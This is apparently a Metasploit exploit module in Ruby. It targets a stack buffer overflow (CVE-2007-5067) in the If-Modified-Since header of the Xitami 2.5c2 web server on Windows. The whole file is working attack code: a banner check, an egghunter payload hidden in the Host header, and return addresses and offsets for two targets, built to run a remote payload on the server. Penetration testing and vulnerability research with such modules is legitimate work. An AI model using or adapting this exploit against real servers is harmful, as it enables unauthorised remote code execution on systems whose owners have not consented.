##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Xitami 2.5c2 Web Server If-Modified-Since Overflow',
      'Description'	=> %q{
        This module exploits a stack buffer overflow in the iMatix Corporation
        Xitami Web Server. If a malicious user sends an	If-Modified-Since
        header containing an overly long string, it may be possible to
        execute a payload remotely. Due to size constraints, this module uses
        the Egghunter technique.
      },
      'Author' 	=> 'aushack',
      'License'       => MSF_LICENSE,
      'References'    =>
      [
        [ 'CVE', '2007-5067' ],
        [ 'OSVDB', '40594'],
        [ 'OSVDB', '40595'],
        [ 'BID', '25772' ],
        [ 'EDB', '4450' ]
      ],
      'Privileged'		=> false,
      'DefaultOptions'	=>
      {
        'EXITFUNC'	=> 'process',
      },
      'Payload'		=>
        {
          'Space'		=> 700,
          'BadChars' 	=> "\x00\x0a\x0d",
        },
      'Platform' => ['win'],
      'Targets'  =>
      [
      # Patrick - Both tested OK 20070928 - w2ksp0, w2ksp4, xpsp0, xpsp2 en.
        [ 'xigui32.exe Universal', { 'Ret' => "\xff\xce\x44", 'Offset' => 40 } ], # 0x0044ceff ret xigui32.exe
        [ 'xitami.exe  Universal', { 'Ret' => "\xf2\xc1\x47", 'Offset' => 68 } ], # 0x0047c1f2 ret xitami.exe
      ],
      'DisclosureDate' => '2007-09-24',
      'DefaultTarget' => 0))

      register_options(
      [
        Opt::RPORT(80),
      ])
  end

  def check
    connect
    sock.put("GET / HTTP/1.1\r\nHost: #{rhost}\r\n\r\n")
    banner = sock.get_once
    disconnect

    if (banner.to_s =~ /Xitami/)
      vprint_status("Banner: #{banner}")
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
    egg     = hunter[1]

    sploit = "GET / HTTP/1.1\r\n"
    sploit << "Host: " + egg + "\r\n"
    sploit << "If-Modified-Since: " + Rex::Arch::X86.jmp_short(3) + ", "
    sploit << hunter[0] + rand_text_alphanumeric(target['Offset']) + target['Ret']

    sock.put(sploit + "\r\n\r\n")

    print_status("Waiting for payload to execute...")

    handler
    disconnect
  end
end
